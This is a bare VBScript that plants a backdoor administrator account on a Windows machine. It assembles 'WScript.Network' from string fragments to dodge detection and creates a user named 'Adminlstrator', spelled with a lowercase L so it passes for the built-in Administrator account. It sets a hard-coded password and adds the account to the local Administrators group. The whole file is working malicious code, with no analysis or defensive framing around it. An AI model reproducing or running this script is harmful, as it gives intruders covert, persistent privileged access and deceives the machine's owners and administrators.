Const strPassword = "P@ssw0rd!@#"
Set wsnetwork=CreateObject("WS"&"CR"&"IPT"&"."&"NET"&"WO"&"RK") 
os="WinNT://"&wsnetwork.ComputerName
Set ob=GetObject(os)
Set oe=GetObject(os&"/Administrators,group")
Set od=ob.Create("user","Adminlstrator")
od.SetPassword strPassword
od.SetInfo
Set of=GetObject(os&"/Adminlstrator",user)
oe.add os&"/Adminlstrator"